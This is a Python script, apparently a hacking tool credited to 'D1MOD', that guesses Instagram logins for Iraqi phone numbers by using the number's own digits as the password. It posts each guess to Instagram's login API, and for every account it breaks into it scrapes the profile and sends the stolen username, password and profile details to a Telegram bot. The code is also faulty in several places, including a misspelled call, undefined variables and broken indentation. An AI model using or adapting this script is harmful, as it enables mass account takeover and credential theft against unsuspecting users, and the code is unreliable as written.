import os
import sys
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        os.system('clear')
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '='

print(BRed+"""

#------------------------------------------#
# BY D1MOD                                 #
# DISCORD SERVER https://discord.gg/d1mod  #
# 1877 UP                                  #
#------------------------------------------#
                                                                                 
""")
print(' ')
print(BPurple+lo*45)
print(' ')                               
myadmin = input("  "+BBlue+"- ID TELEGRAM : ")
tele = input("  "+BBlue+"- TOKEN BOT TELEGRAM :  ")
os.system('clear')
print(BRed+"""
_____ ______  ___  _____  _   __    _____ _____ 
/  __ \| ___ \/ _ \/  __ \| | / /   |_   _|  __ \
| /  \/| |_/ / /_\ \ /  \/| |/ /______| | | |  \/
| |    |    /|  _  | |    |    \______| | | | __ 
| \__/\| |\ \| | | | \__/\| |\  \    _| |_| |_\ \
 \____/\_| \_\_| |_/\____/\_| \_/    \___/ \____/
   """)

print(BRed+lo*55)
print(BRed+lo*55)
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    isp = str(ree['graphql']['user']['is_private'])
    ids = str(ree['graphql']['user']['id'])
    bio = str(ree['graphql']['user']['biography'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
⌯ Hi New instagram
☜︎︎︎== == == == == == == ==☞︎︎︎
⌯ 𝖴𝖲𝖤𝖱 : {user2}
⌯ 𝖭𝖠𝖬𝖤 : {name}
⌯ 𝖯𝖠𝖲𝖲 : {pasw} 
⌯ 𝖥𝖮𝖫𝖫𝖮𝖶𝖤𝖲 : {followes}
⌯ 𝖥𝖮𝖫𝖫𝖮𝖶𝖨𝖭𝖦 : {following}
⌯ 𝖯𝖱𝖨𝖵𝖳: {isp}
⌯ 𝖨𝖣 : {ids}
⌯ 𝖡𝖨𝖮 : {bio}
⌯ 𝖣𝖠𝖳𝖤 : {datee}

☜︎︎︎== == == == == == == ==☞︎︎︎
⌯ D1MOD """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars = '0987654'
    u = '750'
    u1 = str("". join(random.choice(chars)for i in range(7)))
    u2 = str("". join(random.choice(u)for i in range(1)))
    user = '+964'+u+u1
    pasw = '0'+u+u1
    url = 'https://i.instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 6.12.1 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-G531H; grandprimeve3g; sc8830; fr_FR)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BYellow+f"  ⌯ Secure Acc --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
        requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= \n\n palabun \n✔️\n√ @I4m_palabun  |√\
  \n [{zz}]\n-\u300a[{aa}]")
    else:
        print("  "+BRed+f"  ⌯  D1MOD "+BWhite+" :"+BRed+f" {user}:{pasw} ")
    
